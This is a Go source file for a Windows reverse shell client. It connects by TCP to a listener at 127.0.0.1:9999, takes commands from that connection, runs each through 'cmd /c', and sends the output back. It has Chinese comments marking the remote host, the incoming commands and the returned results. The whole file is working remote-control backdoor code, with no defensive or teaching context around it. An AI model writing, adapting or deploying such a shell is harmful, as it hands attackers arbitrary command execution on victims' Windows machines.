package main

import (
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
)

var (
	cmd     string
	path    string
	opBytes []byte
	//line string
)

func main() {
	//path, _ := exec.LookPath(os.Args[0])
	addr := "127.0.0.1:9999" //远程连接主机名
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		os.Exit(1)
	}
	buf := make([]byte, 10240)
	conn.Write([]byte(string("cmd-Golang")))

	for {
		n, err := conn.Read(buf) //接收的命令
		if err != nil && err != io.EOF {
			break
		}
		cmd_str := string(buf[:n])
		cmd := exec.Command("cmd", "/c", cmd_str)
		opBytes, err = cmd.Output()
		if err != nil {
			length := "1"
			opBytes := "[*]error-exec-ok"
			conn.Write([]byte(length))
			conn.Write([]byte(string(opBytes))) //返回执行结果
			continue
		}
		if cmd_str[0:2] == "cd" {
			os.Chdir(cmd_str[2:])
			path, _ = os.Getwd()
			opBytes := path + "Not available"
			conn.Write([]byte(string(opBytes)))
			continue
		}
		var length = strconv.Itoa(len(opBytes))
		if len(opBytes) == 0 {
			length := "1"
			opBytes := "[*]exec-ok"
			conn.Write([]byte(length))
			conn.Write([]byte(string(opBytes)))
			continue
		} else {
			conn.Write([]byte(length))
			conn.Write([]byte(string(opBytes)))
			continue

		}

	}

}
